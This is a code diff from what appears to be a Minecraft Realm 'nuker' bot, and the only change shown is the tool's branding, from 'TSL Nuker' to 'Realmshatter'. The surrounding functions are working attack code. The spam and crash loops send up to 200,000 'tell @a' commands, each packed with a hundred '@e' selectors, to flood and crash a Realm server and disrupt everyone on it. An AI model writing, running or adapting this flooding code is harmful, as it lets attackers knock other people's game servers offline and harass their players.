@@ -389,7 +389,7 @@ async function addRealmCode(realmCode, name, id, host, port, interaction) {
 function spamOne(sendCommand) {
   for (let i = 0; i < 5000; i++) { // more packet = more spam ( be aware if the bot need to send more packets its longer in the realm)
     sendCommand({
-      command: `tell @a §l§c§k${"@e".repeat(100)} |§4§l§ TSL §1§ Nuker §4§ on TOP `,
+      command: `tell @a §l§c§k${"@e".repeat(100)} |§4§l§ Realmshatter §1§ on §4§ TOP `,
       origin: {
         type: 5,
         uuid: '',
@@ -419,7 +419,7 @@ function crashOne(sendCommand) {
 function spamTwo(sendCommand) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ Realmshatter §1§ on §4§ TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -434,7 +434,7 @@ function spamTwo(sendCommand) {
 function crashTwo(sendCommand) {
   for (let i = 0; i < 200000; i++) {
     sendCommand({
-      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ Realmshatter §1§ on §4§ TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -449,7 +449,7 @@ function crashTwo(sendCommand) {
 function spamThree(sendCommand) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ Realmshatter §1§ on §4§  TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -464,7 +464,7 @@ function spamThree(sendCommand) {
 function spamFour(sendCommand) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ Realmshatter §1§ on §4§ TOP`,
       origin: {
         type: 5,
         uuid: '',
